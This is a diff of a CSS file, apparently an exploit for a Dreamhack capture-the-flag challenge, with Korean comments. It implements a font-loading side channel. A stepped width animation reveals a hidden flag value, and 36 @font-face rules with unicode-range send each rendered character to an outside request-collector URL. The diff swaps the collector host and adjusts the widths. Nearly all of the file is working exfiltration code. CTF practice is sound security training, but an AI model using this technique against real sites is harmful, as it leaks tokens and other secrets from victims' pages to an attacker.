@@ -2,11 +2,11 @@
 
 #flag {
   content: var(--flag);
-  display: block;
   font-family: Courier New, monospace;
   word-break: break-all;
+  white-space: normal;
   overflow: hidden;
-  width: 0ch;            
+  width: 3px;            
   animation: leak 60s steps(32) forwards;
 }
 
@@ -16,45 +16,45 @@
 }
 
 /* 폰트 side-channel 설정 (문자 추출용) */
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?0); unicode-range:U+0030;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?1); unicode-range:U+0031;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?2); unicode-range:U+0032;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?3); unicode-range:U+0033;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?4); unicode-range:U+0034;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?5); unicode-range:U+0035;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?6); unicode-range:U+0036;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?7); unicode-range:U+0037;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?8); unicode-range:U+0038;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?9); unicode-range:U+0039;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?a); unicode-range:U+0061;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?b); unicode-range:U+0062;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?c); unicode-range:U+0063;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?d); unicode-range:U+0064;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?e); unicode-range:U+0065;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?f); unicode-range:U+0066;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?g); unicode-range:U+0067;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?h); unicode-range:U+0068;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?i); unicode-range:U+0069;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?j); unicode-range:U+006a;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?k); unicode-range:U+006b;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?l); unicode-range:U+006c;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?m); unicode-range:U+006d;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?n); unicode-range:U+006e;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?o); unicode-range:U+006f;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?p); unicode-range:U+0070;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?q); unicode-range:U+0071;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?r); unicode-range:U+0072;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?s); unicode-range:U+0073;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?t); unicode-range:U+0074;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?u); unicode-range:U+0075;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?v); unicode-range:U+0076;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?w); unicode-range:U+0077;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?x); unicode-range:U+0078;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?y); unicode-range:U+0079;}
-@font-face{ font-family:poc; src: url(https://qlfnyvu.request.dreamhack.games/?z); unicode-range:U+007a;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=0"); unicode-range:U+0030;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=1"); unicode-range:U+0031;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=2"); unicode-range:U+0032;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=3"); unicode-range:U+0033;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=4"); unicode-range:U+0034;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=5"); unicode-range:U+0035;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=6"); unicode-range:U+0036;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=7"); unicode-range:U+0037;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=8"); unicode-range:U+0038;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=9"); unicode-range:U+0039;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=a"); unicode-range:U+0061;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=b"); unicode-range:U+0062;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=c"); unicode-range:U+0063;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=d"); unicode-range:U+0064;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=e"); unicode-range:U+0065;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=f"); unicode-range:U+0066;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=g"); unicode-range:U+0067;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=h"); unicode-range:U+0068;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=i"); unicode-range:U+0069;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=j"); unicode-range:U+006a;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=k"); unicode-range:U+006b;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=l"); unicode-range:U+006c;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=m"); unicode-range:U+006d;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=n"); unicode-range:U+006e;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=o"); unicode-range:U+006f;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=p"); unicode-range:U+0070;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=q"); unicode-range:U+0071;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=r"); unicode-range:U+0072;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=s"); unicode-range:U+0073;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=t"); unicode-range:U+0074;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=u"); unicode-range:U+0075;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=v"); unicode-range:U+0076;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=w"); unicode-range:U+0077;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=x"); unicode-range:U+0078;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=y"); unicode-range:U+0079;}
+@font-face{ font-family:poc; src: url("https://jxqmsdg.request.dreamhack.games/?leak=z"); unicode-range:U+007a;}
 
 /* width 증가를 통해 문자를 차례로 추출 */
 @keyframes leak {
-  from { width: 0ch; }
-  to { width: 32ch; }
+  from { width: 3px; }
+  to { width: 800px; }
 }
